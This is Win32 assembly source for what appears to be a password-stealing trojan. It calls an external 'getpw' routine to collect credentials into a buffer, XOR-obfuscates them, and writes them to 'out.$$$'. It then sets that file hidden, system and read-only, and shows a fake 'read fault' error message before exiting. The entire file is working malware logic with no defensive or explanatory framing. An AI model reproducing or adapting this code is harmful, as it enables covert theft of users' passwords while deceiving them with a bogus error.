	P386
	MODEL   flat, stdcall
	JUMPS
	LOCALS

INCLUDE W32.inc

EXTRN	SetFileAttributesA		: PROC
EXTRN   FormatMessageA                  : PROC
EXTRN	LocalFree			: PROC

EXTRN	getpw				: PROC

	DATASEG

XOR_MASK	EQU	0FFh
Filename	DB	"out.$$$", NULL

	UDATASEG

Handle		DD	?
bytes_rdwr	DD	?

lpErrMsgBuf	DD	?

Data		DB	10000h DUP (?)

	CODESEG

Start:
	call	getpw, offset Data
	cmp	eax, -1
	jz	@@Bye

	mov	ecx, eax
	mov	esi, offset Data
	mov	edi, esi

	push	ecx
	jcxz	@@Dump

@@Crypt:
	lodsb
	xor	al, XOR_MASK
	stosb
	loop	@@Crypt


@@Dump:
	call	CreateFile, offset Filename, GENERIC_READ + GENERIC_WRITE,\
		0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
	mov	[Handle], eax
	pop	eax
	call	WriteFile, Handle, offset Data, eax, offset bytes_rdwr, 0
	call	CloseHandle, Handle
	call	SetFileAttributesA, offset Filename,\
		FILE_ATTRIBUTE_READONLY +\
		FILE_ATTRIBUTE_HIDDEN +\
		FILE_ATTRIBUTE_SYSTEM +\
		FILE_ATTRIBUTE_ARCHIVE


@@Bye:
	call	FormatMessageA, 1100h, NULL, ERROR_READ_FAULT, 400h, offset lpErrMsgBuf, 0, NULL
	call	MessageBox, NULL, lpErrMsgBuf, NULL, MB_OK + MB_ICONSTOP + MB_TASKMODAL
	call	LocalFree, lpErrMsgBuf

	call    ExitProcess, 0

END Start
